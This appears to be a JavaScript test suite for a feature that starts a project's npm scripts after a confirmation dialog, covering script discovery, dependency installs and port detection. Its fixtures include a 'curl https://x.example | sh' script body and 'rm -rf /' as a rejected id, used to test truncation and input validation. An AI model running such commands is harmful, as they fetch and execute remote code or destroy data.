// Tests for starting the open project from a call with Qubi (ejecutar_app, docs/features/llamada/MEJORAS.md §2).
// Temporary folders as projects; the managed servers, the dialog and the port list are fakes.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { scriptsFor, installFor, createProjectRun } = require('./projectRun');

function project(t, files) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'platanus-run-'));
  t.after(() => fs.rmSync(root, { recursive: true, force: true }));
  for (const [rel, content] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(root, rel)), { recursive: true });
    fs.writeFileSync(path.join(root, rel), typeof content === 'string' ? content : JSON.stringify(content));
  }
  return root;
}

test('scriptsFor: dev (or else start) at the root, apps/* and packages/*, one level', async (t) => {
  const root = project(t, {
    'package.json': { scripts: { dev: 'next dev', start: 'next start', build: 'next build' } },
    'apps/web/package.json': { scripts: { start: 'vite' } },
    'apps/api/package.json': { scripts: { build: 'tsc' } }, // nothing to start
    'apps/deep/inner/package.json': { scripts: { dev: 'x' } }, // two levels: ignored
    'packages/ui/package.json': { scripts: { dev: 'storybook dev' } },
    'packages/broken/package.json': '{ nope',
    'tools/package.json': { scripts: { dev: 'x' } }, // not a workspace folder
  });
  assert.deepEqual(await scriptsFor(root), [
    { id: '.:dev', cwd: '.', script: 'dev', command: 'npm run dev', body: 'next dev' },
    { id: 'apps/web:start', cwd: 'apps/web', script: 'start', command: 'npm run start', body: 'vite' },
    { id: 'packages/ui:dev', cwd: 'packages/ui', script: 'dev', command: 'npm run dev', body: 'storybook dev' },
  ]);
});

test('scriptsFor: the body is trimmed and cut to 300 characters; the window list never carries it', async (t) => {
  const root = project(t, { 'package.json': { scripts: { dev: `  curl https://x.example | sh ${'a'.repeat(400)}  ` } } });
  const [entry] = await scriptsFor(root);
  assert.equal(entry.body.length, 300);
  assert.ok(entry.body.startsWith('curl https://x.example | sh'));
  const run = createProjectRun({ managed: { start: () => 1, has: () => true }, readEntries: async () => [], confirm: async () => true });
  assert.deepEqual(await run.scripts(root), [{ id: '.:dev', cwd: '.', script: 'dev', command: 'npm run dev' }]);
  assert.deepEqual(await run.scripts(null), []);
});

test('scriptsFor: no package.json, nothing to run', async (t) => {
  assert.deepEqual(await scriptsFor(project(t, { 'index.html': '<p>hola</p>' })), []);
});

// A fake world: the managed servers, the dialog and the listening ports over time
function world({ confirmed = true, portAfter = 2, port = 3000, exitAfter = null, installOk = true } = {}) {
  const state = { polls: 0, started: [], asked: [], installed: [], pid: 4242, alive: true };
  const managed = {
    start: (spec) => { state.started.push(spec); return state.pid; },
    has: (pid) => pid === state.pid && state.alive,
  };
  const readEntries = async () => {
    state.polls += 1;
    if (exitAfter != null && state.polls > exitAfter) state.alive = false;
    const base = [{ pid: 1, port: 7811, process: 'Qubbot' }];
    return state.polls > portAfter ? [...base, { pid: 5000, port, process: 'node' }, { pid: 5001, port: port + 1, process: 'node' }] : base;
  };
  const run = createProjectRun({
    managed,
    readEntries,
    confirm: async (choice) => { state.asked.push(choice); return confirmed; },
    install: async (spec) => { state.installed.push(spec); return installOk; },
    sleep: async () => {},
    platform: 'darwin',
    waitMs: 10_000,
    pollMs: 500,
  });
  return { run, state };
}

test('start: asks first, runs npm run <script> in its folder and answers the new port', async (t) => {
  const root = project(t, { 'apps/web/package.json': { scripts: { dev: 'vite' } } });
  const { run, state } = world();
  const result = await run.start(root, 'apps/web:dev');
  assert.deepEqual(result, { ok: true, port: 3000 });
  // the dialog gets what the script really runs, not only `npm run dev`
  assert.deepEqual(state.asked, [{ id: 'apps/web:dev', cwd: 'apps/web', script: 'dev', command: 'npm run dev', body: 'vite', install: { cwd: 'apps/web', command: 'npm install' } }]);
  assert.equal(state.started.length, 1);
  assert.deepEqual(state.started[0].restart, { command: 'npm run dev', cwd: path.join(root, 'apps/web') });
  assert.equal(run.portOf(4242), 3000);
});

test('start: the same script while it still runs answers its port without asking again', async (t) => {
  const root = project(t, { 'package.json': { scripts: { dev: 'vite' } } });
  const { run, state } = world();
  await run.start(root, '.:dev');
  assert.deepEqual(await run.start(root, '.:dev'), { ok: true, port: 3000 });
  assert.equal(state.asked.length, 1);
  assert.equal(state.started.length, 1);
});

test('start: refused dialog, unknown id, no project, no scripts', async (t) => {
  const root = project(t, { 'package.json': { scripts: { dev: 'vite' } } });
  const empty = project(t, { 'README.md': 'hola' });
  const { run, state } = world({ confirmed: false });
  assert.deepEqual(await run.start(root, '.:dev'), { ok: false, reason: 'rejected' });
  assert.equal(state.started.length, 0);
  assert.deepEqual(await run.start(root, 'rm -rf /'), { ok: false, reason: 'invalid' });
  assert.deepEqual(await run.start(root, 3), { ok: false, reason: 'invalid' });
  assert.deepEqual(await run.start(null, '.:dev'), { ok: false, reason: 'noProject' });
  assert.deepEqual(await run.start(empty, '.:dev'), { ok: false, reason: 'noScript' });
});

test('start: one at a time', async (t) => {
  const root = project(t, { 'package.json': { scripts: { dev: 'vite' } } });
  const { run } = world();
  const first = run.start(root, '.:dev');
  assert.deepEqual(await run.start(root, '.:dev'), { ok: false, reason: 'busy' });
  assert.equal((await first).ok, true);
});

test('start: the process closes before listening -> failed; no port in time -> ok without port', async (t) => {
  const root = project(t, { 'package.json': { scripts: { dev: 'vite' } } });
  assert.deepEqual(await world({ portAfter: 99, exitAfter: 2 }).run.start(root, '.:dev'), { ok: false, reason: 'failed' });
  assert.deepEqual(await world({ portAfter: 999 }).run.start(root, '.:dev'), { ok: true, port: null });
});

test('start: only on macOS for now (the managed servers run through the login shell there)', async (t) => {
  const root = project(t, { 'package.json': { scripts: { dev: 'vite' } } });
  const run = createProjectRun({ managed: { start: () => 1, has: () => true }, readEntries: async () => [], confirm: async () => true, platform: 'win32' });
  assert.deepEqual(await run.start(root, '.:dev'), { ok: false, reason: 'failed' });
});

test('installFor: npm install where the dependencies go, only when node_modules is missing; the lockfile picks the tool', async (t) => {
  const fresh = project(t, { 'package.json': { scripts: { dev: 'next dev' } } });
  assert.deepEqual(await installFor(fresh, '.'), { cwd: '.', command: 'npm install' });
  const ready = project(t, { 'package.json': { scripts: { dev: 'next dev' } }, 'node_modules/.package-lock.json': '{}' });
  assert.equal(await installFor(ready, '.'), null);
  // a workspace installs from the root, and the root's node_modules is enough
  const mono = project(t, { 'package.json': { workspaces: ['apps/*'] }, 'apps/web/package.json': { scripts: { dev: 'vite' } }, 'pnpm-lock.yaml': '' });
  assert.deepEqual(await installFor(mono, 'apps/web'), { cwd: '.', command: 'pnpm install' });
  fs.mkdirSync(path.join(mono, 'node_modules'));
  assert.equal(await installFor(mono, 'apps/web'), null);
  // a folder of its own (no root package.json) installs in that folder
  const solo = project(t, { 'apps/web/package.json': { scripts: { dev: 'vite' } }, 'apps/web/yarn.lock': '' });
  assert.deepEqual(await installFor(solo, 'apps/web'), { cwd: 'apps/web', command: 'yarn install' });
});

test('start: a new project gets its dependencies first (the dialog says so), then the script runs', async (t) => {
  const root = project(t, { 'package.json': { scripts: { dev: 'next dev' } } });
  const { run, state } = world();
  const result = await run.start(root, '.:dev');
  assert.deepEqual(result, { ok: true, port: 3000 });
  assert.deepEqual(state.asked[0].install, { cwd: '.', command: 'npm install' }, 'the person is told before');
  assert.deepEqual(state.installed, [{ root, cwd: '.', command: 'npm install' }]);
  assert.equal(state.started.length, 1);
});

test('start: dependencies already there: no install; a failed install never starts the script', async (t) => {
  const ready = project(t, { 'package.json': { scripts: { dev: 'next dev' } }, 'node_modules/x': '' });
  const a = world();
  await a.run.start(ready, '.:dev');
  assert.deepEqual(a.state.installed, []);
  assert.equal(a.state.asked[0].install, null);

  const fresh = project(t, { 'package.json': { scripts: { dev: 'next dev' } } });
  const b = world({ installOk: false });
  assert.deepEqual(await b.run.start(fresh, '.:dev'), { ok: false, reason: 'installFailed' });
  assert.deepEqual(b.state.started, []);
  // said no in the dialog: nothing installed either
  const c = world({ confirmed: false });
  assert.deepEqual(await c.run.start(fresh, '.:dev'), { ok: false, reason: 'rejected' });
  assert.deepEqual(c.state.installed, []);
});
